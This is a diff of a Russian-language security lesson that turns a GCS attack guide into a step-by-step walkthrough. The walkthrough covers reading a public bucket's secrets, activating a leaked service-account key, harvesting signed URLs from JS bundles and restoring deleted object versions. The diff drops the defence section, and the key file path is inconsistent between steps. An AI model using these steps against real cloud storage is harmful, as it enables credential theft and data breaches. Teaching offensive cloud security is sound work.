@@ -15,171 +15,157 @@ estimated_minutes: 45
 summary: "GCS: IAM vs ACL, uniform bucket-level access, публичные бакеты, signed URLs и object versioning. Как находить и читать данные, которые «должны быть приватными»."
 ---
 
-## Зачем этот урок
+## Задача
 
-Cloud Storage (GCS) — объектное хранилище GCP и крупнейший источник утечек. Бакеты делают публичными «на минуту» для теста и забывают; ACL оставляют открытыми; signed URL живут месяцами. Атакующего интересуют: публичные бакеты, слабые IAM-политики, утёкшие signed URLs, версии объектов (включая удалённые) и то, что бакеты иногда имеют предсказуемые имена (`company-backups`, `company-prod-assets`).
+**Cloud Storage (GCS)** — объектное хранилище Google Cloud. Это крупнейший источник облачных утечек: бакеты делают публичными «на минуту» для теста и забывают, ACL оставляют открытыми, а **signed URL** живут месяцами. Цель урока: найти бакет, который «должен быть приватным», и прочитать из него данные — вплоть до ключей сервисного аккаунта.
 
-## Модель GCS
+## Данные, с которыми работаем
 
-- **Bucket** — контейнер с глобально уникальным именем.
-- **Object** — файл; у него есть поколения (generations) и метаданные.
-- **IAM** — роли на бакет/объект (`roles/storage.objectViewer` и т.п.), наследуются от проекта.
-- **ACL** — per-object/per-bucket гранты (legacy). При **uniform bucket-level access** (UBLA) ACL отключены, и всё решает IAM.
-- **Signed URL** — временная ссылка с подписью, дающая доступ без аутентификации.
-- **Object versioning** — хранит старые поколения; soft-delete хранит удалённые объекты.
-- **Public access prevention** — организация может запретить публичность на уровне org policy.
+Разберём модель:
+- **Bucket** — контейнер с глобально уникальным именем (имя видно всем);
+- **Object** — файл внутри; у него есть **поколения (generations)** — версии;
+- **IAM** — роли на бакет/объект (`roles/storage.objectViewer`), наследуются от проекта;
+- **ACL** — старые per-object гранты; при **uniform bucket-level access (UBLA)** они отключены;
+- **Signed URL** — подписанная ссылка, дающая доступ без аутентификации.
 
-Ключевые права: `storage.buckets.list`, `storage.objects.get`, `storage.objects.list`, `storage.buckets.getIamPolicy`, `storage.objects.getIamPolicy`.
-
-## Инструменты и команды
+Стартуем с инвентаризации бакетов проекта:
 
 ```bash
-# Список бакетов проекта
-gcloud storage buckets list --project PROJECT_ID
-gsutil ls -p PROJECT_ID
-
-# IAM бакета
-gcloud storage buckets get-iam-policy gs://my-bucket
-# allUsers с roles/storage.objectViewer = публичный бакет
-
-# Публичный доступ
-gsutil iam get gs://my-bucket | grep -A2 allUsers
-
-# Содержимое и объекты
-gcloud storage ls -r gs://my-bucket/**
-gsutil ls -l gs://my-bucket/ | head
-
-# Версии объектов (включая старые)
-gsutil ls -a gs://my-bucket/secret.txt
-gsutil cp gs://my-bucket/secret.txt#1699999999999999 /tmp/old-secret.txt
-
-# Публичное чтение без аутентификации
-curl -s "https://storage.googleapis.com/my-bucket/config.json" | head
-
-# Перебор имён бакетов
-for n in backups prod-assets company-data; do curl -s -o /dev/null -w "%{http_code} $n\n" "https://storage.googleapis.com/$n"; done
+$ gcloud storage buckets list --project acme-prod
+NAME                     LOCATION
+company-ci-artifacts     US
+company-backups          US
 ```
 
-## Разобранный пример: публичный бакет → секреты
-
-Сценарий: бакет `company-ci-artifacts` публичен.
+Имя `company-ci-artifacts` намекает на артефакты сборки — а там часто лежат секреты. Проверяем IAM:
 
 ```bash
-gsutil iam get gs://company-ci-artifacts | jq '.bindings[] | select(.members[]? == "allUsers")'
-# {"role":"roles/storage.objectViewer","members":["allUsers"]}
-
-gcloud storage ls -r gs://company-ci-artifacts/**
-# gs://company-ci-artifacts/builds/app-v1.2.3.tar.gz
-# gs://company-ci-artifacts/secrets/prod.env
-# gs://company-ci-artifacts/kube/config
-
-gsutil cp gs://company-ci-artifacts/secrets/prod.env /tmp/
-cat /tmp/prod.env
-# DB_PASSWORD=...
-# GCP_SA_KEY={"type":"service_account","private_key":"-----BEGIN PRIVATE KEY-----..."}
+$ gcloud storage buckets get-iam-policy gs://company-ci-artifacts
+bindings:
+- members:
+  - allUsers
+  role: roles/storage.objectViewer
 ```
 
-Найденный service-account JSON-ключ даёт полноценный доступ к проекту. Даже если бакет потом закрыли, ключ продолжает работать до ротации.
+Член **`allUsers`** означает: бакет доступен **всем, включая анонимов**. Это публичный бакет.
 
-## Signed URLs и versioning
+## Шаг 1: читаем содержимое без аутентификации
 
-- **Signed URL** — подписанная ссылка (`X-Goog-Signature`). Если она утекла в лог/репозиторий, доступ есть до истечения срока (может быть до 7 дней, иногда дольше через impersonation). Ищите в JS, мобильных приложениях, логах прокси.
-- **Versioning** — включённый versioning хранит старые версии; даже если секрет «удалили», старое поколение может быть доступно. `gsutil cp 'gs://bucket/obj#GENERATION'`.
-- **Soft delete** — удалённые объекты хранятся 7 дней; `storage.objects.restore` возвращает их.
-- **Retention policy / Bucket Lock** — если включены, объекты нельзя удалить до срока (защита, но и источник данных).
+Даже не имея аккаунта, мы можем просто скачать объект по HTTP. Но сначала посмотрим, что там есть:
 
 ```bash
-# Восстановление удалённого объекта
-gcloud storage restore gs://my-bucket/secret.txt
-
-# Список с поколениями
-gsutil ls -a gs://my-bucket/secret.txt
+$ gcloud storage ls -r gs://company-ci-artifacts/**
+gs://company-ci-artifacts/builds/app-v1.2.3.tar.gz
+gs://company-ci-artifacts/secrets/prod.env
+gs://company-ci-artifacts/kube/config
 ```
 
-## Чек-лист атаки
+Каталог `secrets/` — то, ради чего всё затевалось. Скачиваем:
 
-1. `gcloud storage buckets list` — инвентаризация.
-2. Проверить `allUsers`/`allAuthenticatedUsers` в IAM бакетов.
-3. Перебрать предсказуемые имена бакетов.
-4. Искать signed URLs в клиентах и логах.
-5. Проверить versioning/soft-delete на чувствительных объектах.
-6. Проверить `storage.buckets.getIamPolicy` и `setIamPolicy` — право менять IAM бакета.
-7. Проверить наследование: право на проект (`roles/storage.admin`) даёт всё.
+```bash
+$ curl -s "https://storage.googleapis.com/company-ci-artifacts/secrets/prod.env" -o /tmp/prod.env
+$ cat /tmp/prod.env
+DB_PASSWORD=Sup3rPr0d!
+GCP_SA_KEY={"type":"service_account","private_key":"-----BEGIN PRIVATE KEY-----..."}
+```
 
-## Обход защит и edge cases
+В бакете лежит **ключ сервисного аккаунта GCP** — JSON с приватным ключом. Это полноценная облачная идентичность: активировав её, мы получаем доступ к проекту от имени сервисного аккаунта. Даже если бакет потом закроют, ключ продолжит работать до ротации.
 
-- **UBLA.** При uniform bucket-level access ACL отключены; смотрите только IAM. При fine-grained — ACL могут открывать объекты в обход IAM.
-- **Public access prevention.** Org policy `storage.publicAccessPrevention` блокирует `allUsers`. Проверяйте, включена ли она: если нет, бакет можно сделать публичным.
+## Шаг 2: используем найденный ключ
+
+```bash
+$ gcloud auth activate-service-account --key-file=/tmp/sa_key.json
+Activated service account credentials for: [ci-bot@acme-prod.iam.gserviceaccount.com]
+$ gcloud projects list
+PROJECT_ID      NAME
+acme-prod       Acme Production
+acme-data       Acme Data
+```
+
+Из публичного бакета — в проект.
+
+## Полный прогон от начала до конца
+
+1. `buckets list` → нашли `company-ci-artifacts`.
+2. `get-iam-policy` → `allUsers` → бакет публичный.
+3. `ls -r` → обнаружили `secrets/prod.env`.
+4. Скачали через HTTP без аутентификации → получили SA-ключ.
+5. Активировали ключ → доступ к проекту.
+
+## Если публичного бакета нет: signed URL и версии
+
+**Signed URL** — подписанная ссылка, которая работает без учётных данных. Частая утечка: разработчик генерирует ссылку для скачивания и она попадает в JS-бандл, мобильное приложение или лог прокси. Ищем в бандле:
+
+```bash
+$ curl -s https://app.example.com/main.js | \
+    grep -oE 'https://storage.googleapis.com/[^"]*X-Goog-Signature[^"]*' | head -1
+https://storage.googleapis.com/company-exports/report.csv?X-Goog-Algorithm=GOOG4-RSA-SHA256&X-Goog-Expires=604800&X-Goog-Signature=...
+$ curl -s "https://storage.googleapis.com/company-exports/report.csv?X-Goog-Algorithm=..." -o report.csv
+$ head -2 report.csv
+id,email,plan,revenue
+1,user@example.com,pro,1200
+```
+
+`X-Goog-Expires=604800` — это 7 дней; ссылка действует до истечения срока. Если она выдана на **запись** (`PUT`), можно загрузить свой объект — потенциальная подмена данных.
+
+**Object versioning** хранит старые поколения. Даже если секрет «удалили», старая версия может быть доступна:
+
+```bash
+$ gsutil ls -a gs://company-backups/db-creds.txt
+gs://company-backups/db-creds.txt#1699999999999999
+gs://company-backups/db-creds.txt#1700000000000000
+$ gsutil cp 'gs://company-backups/db-creds.txt#1699999999999999' /tmp/old.txt
+```
+
+`#1699999999999999` — номер поколения. Плюс **soft-delete** хранит удалённые объекты 7 дней, и их можно восстановить.
+
+## Если не сработало: обходы и edge cases
+
+- **UBLA.** При uniform bucket-level access ACL отключены — смотри только IAM. При fine-grained ACL могут открывать объект **в обход** IAM.
+- **Public access prevention.** Org policy `storage.publicAccessPrevention` блокирует `allUsers`. Проверь, включена ли она: если нет, бакет можно сделать публичным.
 - **VPC Service Controls.** Может блокировать доступ к GCS извне периметра — тогда нужен пивот внутри VPC.
-- **CMEK.** Шифрование собственным ключом KMS: чтение требует `cloudkms.cryptoKeyVersions.useToDecrypt`.
-- **Retention.** Bucket Lock не даёт удалить объекты — учитывайте в эксфильтрации (но чтение доступно).
+- **CMEK.** Шифрование собственным ключом KMS: для чтения нужен `cloudkms.cryptoKeyVersions.useToDecrypt`.
+- **Наследование прав.** `roles/storage.admin` на уровне **проекта** даёт доступ ко всем бакетам — проверяй права проекта, а не только бакета.
 
 ## Частые ошибки и подводные камни
 
-- Считать, что «бакет приватный», не проверив IAM и ACL.
-- Игнорировать versioning: старые версии часто содержат то, что «уже удалили».
-- Забыть про soft-delete (7 дней).
-- Не проверить signed URLs — они не требуют аутентификации.
-- Путать права проекта и бакета: `roles/storage.admin` на проекте = доступ ко всем бакетам.
+- **Считать бакет приватным без проверки.** Смотрите и IAM, и ACL — при fine-grained доступе ACL может открывать объект в обход IAM.
+- **Игнорировать versioning.** Старые поколения часто содержат то, что «уже удалили».
+- **Забывать про soft-delete.** Удалённые объекты хранятся 7 дней и могут быть восстановлены.
+- **Не проверять signed URLs.** Они не требуют аутентификации и живут до истечения срока (до 7 дней).
+- **Путать права проекта и бакета.** `roles/storage.admin` на уровне проекта даёт доступ ко всем бакетам.
+- **Не смотреть UBLA.** При uniform bucket-level access ACL отключены — тогда единственный барьер это IAM.
 
-## Защита и детект
+- **Игнорировать public access prevention.** Если org policy её не включает, бакет можно сделать публичным в любой момент.
+- **Не проверять CMEK.** Данные под собственным ключом KMS требуют `useToDecrypt`; без него чтение упадёт.
 
-- Включить uniform bucket-level access и public access prevention.
-- Не хранить секреты в бакетах; использовать Secret Manager.
-- Ограничить `storage.buckets.setIamPolicy` и `storage.objects.get` минимальным scope.
-- Включить Cloud Audit Logs (data access) для чувствительных бакетов; алертить на аномальные чтения.
-- Настроить retention/Bucket Lock для критичных данных и ротацию ключей.
+- **Забывать про VPC Service Controls.** Периметр может блокировать доступ извне — тогда нужен пивот внутри VPC.
+- **Не проверять наследование прав.** Право на проект может открывать бакеты, которые вы не видели при инвентаризации.
 
-## Модель угроз и типовые мисконфиги
+## Что мы теперь знаем
 
-Типичный мисконфиг — `allUsers` в IAM бакета. Второй — ACL, открывающий объект. Третий — секреты в бакете (SA-ключи, `.env`). Четвёртый — versioning без контроля доступа. Пятый — signed URL с длинным сроком в публичном клиенте. Все ведут к утечке данных или ключей.
+- `allUsers` в IAM бакета = публичный бакет, доступ без аутентификации.
+- В бакетах часто лежат `.env` и SA-ключи — из публичного бакета можно попасть в проект.
+- Signed URL работает без учётных данных до истечения срока (до 7 дней).
+- Versioning и soft-delete хранят «удалённые» объекты.
+- UBLA отключает ACL; public access prevention блокирует публичность.
+- Права проекта (`roles/storage.admin`) дают всё; проверяй наследование.
 
-## Практическое задание
+## На что смотреть дальше
 
-1. Создайте бакет, включите versioning, загрузите объект и перезапишите его.
-2. Откройте бакет через `allUsers` и прочитайте объект без аутентификации.
-3. Сгенерируйте signed URL и откройте его из другого окружения.
-4. Включите public access prevention и проверьте, что публичность блокируется.
-
-## Что дальше / решение
-
-Из GCS достаём данные и ключи. Дальше — использовать найденные SA-ключи для доступа к проекту. Зафиксируйте путь «публичный бакет/версия → секреты» в графе. При VPC-SC или CMEK без прав — `blocked` с условием.
-
-## Разобранный пример 2: signed URL из клиента
-
-Signed URL — распространённая утечка: разработчик генерирует ссылку для загрузки/скачивания и она попадает в JS-бандл, мобильное приложение или лог прокси.
-
-```bash
-# Ищем подписанные ссылки в бандле
-curl -s https://app.example.com/main.js | grep -oE 'https://storage.googleapis.com/[^"]*X-Goog-Signature[^"]*' | head
-# https://storage.googleapis.com/company-exports/report.csv?X-Goog-Algorithm=GOOG4-RSA-SHA256&X-Goog-Expires=604800&X-Goog-Signature=...
-
-# Используем как есть (без аутентификации)
-curl -s "https://storage.googleapis.com/company-exports/report.csv?X-Goog-Algorithm=..." -o report.csv
-head -3 report.csv
-# id,email,plan,revenue
-# 1,user@example.com,pro,1200
-
-# Проверяем срок действия
-echo "X-Goog-Expires: 604800 секунд = 7 дней"
-```
-
-Срок действия signed URL может быть до 7 дней (для SA с ключом) или до 12 часов (для impersonation). Если ссылка выдана на запись (`PUT`), можно загрузить свой объект — потенциальная подмена данных или, если объект используется как конфиг, влияние на приложение. Также проверяйте параметр `X-Goog-SignedHeaders`: иногда подпись покрывает только `host`, что позволяет менять другие заголовки.
-
-## Практическое задание (продолжение)
-
-1. Сгенерируйте signed URL на чтение объекта и откройте его из окружения без аутентификации.
-2. Сгенерируйте signed URL на запись и загрузите объект, изменив его содержимое.
-3. Включите versioning и убедитесь, что старая версия осталась доступной.
-4. Включите public access prevention и проверьте, что `allUsers` больше не добавляется.
+- **gcp-firebase**: открытые базы и правила доступа Firebase.
+- **gcp-bigquery**: публичные датасеты и экспорт данных.
+- **gcp-gke**: захват метаданных пода и node SA.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Что означает член allUsers в IAM бакета?"
   options:
     - "Бакет публичен для всех, включая анонимов"
-    - "Бакет только для сотрудников"
+    - "Бакет доступен только сотрудникам"
     - "Бакет зашифрован"
     - "Бакет удалён"
   answer: 0
@@ -194,9 +180,9 @@ echo "X-Goog-Expires: 604800 секунд = 7 дней"
   explanation: "UBLA убирает fine-grained ACL, всё решает IAM."
 - question: "Почему versioning опасен для владельца данных?"
   options:
-    - "Старые версии объектов могут содержать «удалённые» секреты"
+    - "Старые версии объектов могут содержать уже «удалённые» секреты"
     - "Он замедляет чтение"
-    - "Он публикует бакет"
+    - "Он публикует бакет автоматически"
     - "Он удаляет IAM"
   answer: 0
   explanation: "Versioning хранит прошлые поколения, доступные при наличии прав."
@@ -208,7 +194,19 @@ echo "X-Goog-Expires: 604800 секунд = 7 дней"
     - "Запросить IAM-роль"
   answer: 0
   explanation: "Signed URL содержит подпись и действует без учётных данных."
+- question: "Почему бакет с именем company-ci-artifacts особенно интересен?"
+  options:
+    - "В артефактах сборки часто лежат .env и ключи сервисных аккаунтов"
+    - "Он всегда зашифрован"
+    - "Он недоступен анонимам"
+    - "Он хранит только логи"
+  answer: 0
+  explanation: "CI-артефакты регулярно содержат секреты, которые забыли убрать."
 ```
+
+## Куда дальше
+
+В следующем уроке мы разберём **Firebase** — открытые базы данных и слабые security rules, которые часто становятся входом в GCP-проект. А пока главное запомни: **в GCS главный приз — не файлы, а ключи**, и один публичный бакет с `.env` может открыть весь проект.
 
 ## Где пригодится
 
